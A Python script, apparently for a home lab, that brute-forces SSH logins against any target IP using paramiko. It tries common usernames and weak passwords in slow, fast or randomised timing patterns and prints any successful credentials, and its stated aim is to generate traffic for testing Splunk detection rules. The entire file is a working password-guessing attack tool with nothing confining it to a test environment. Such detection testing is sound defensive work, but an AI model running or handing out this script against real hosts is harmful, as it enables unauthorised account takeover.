#!/usr/bin/env python3
"""
SSH Brute Force Simulator
Generates varied attack patterns for testing Splunk detection
"""

import paramiko
import time
import random
import sys

def ssh_attempt(target, username, password):
    """Attempt SSH login with given credentials"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, username=username, password=password, timeout=3)
        print(f"✅ SUCCESS: {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"❌ Failed: {username}:{password}")
        return False
    except Exception as e:
        print(f"⚠️ Error: {e}")
        return False

def slow_attack(target, users, passwords):
    """Slow attack with 3-second delays"""
    print("\n[*] Starting SLOW attack pattern...")
    for user in users:
        for pwd in passwords[:3]:
            ssh_attempt(target, user, pwd)
            time.sleep(3)

def fast_attack(target, users, passwords):
    """Fast attack with 0.5-second delays"""
    print("\n[*] Starting FAST attack pattern...")
    for user in users[:2]:
        for pwd in passwords:
            ssh_attempt(target, user, pwd)
            time.sleep(0.5)

def random_attack(target, users, passwords):
    """Random attack with varied delays"""
    print("\n[*] Starting RANDOM attack pattern...")
    for i in range(20):
        user = random.choice(users)
        pwd = random.choice(passwords)
        delay = random.uniform(1, 5)
        ssh_attempt(target, user, pwd)
        time.sleep(delay)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 python_bruteforce.py <target_ip>")
        print("Example: python3 python_bruteforce.py 192.168.1.50")
        sys.exit(1)
    
    target = sys.argv[1]
    users = ["admin", "root", "testuser", "rootbackup"]
    passwords = ["123456", "password", "admin", "Password123", "Welcome1"]
    
    print(f"[*] Targeting: {target}")
    print("\nChoose attack pattern:")
    print("1. Slow attack (3 sec delay)")
    print("2. Fast attack (0.5 sec delay)")
    print("3. Random attack (1-5 sec delay)")
    
    choice = input("Enter choice (1-3): ")
    
    if choice == "1":
        slow_attack(target, users, passwords)
    elif choice == "2":
        fast_attack(target, users, passwords)
    elif choice == "3":
        random_attack(target, users, passwords)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()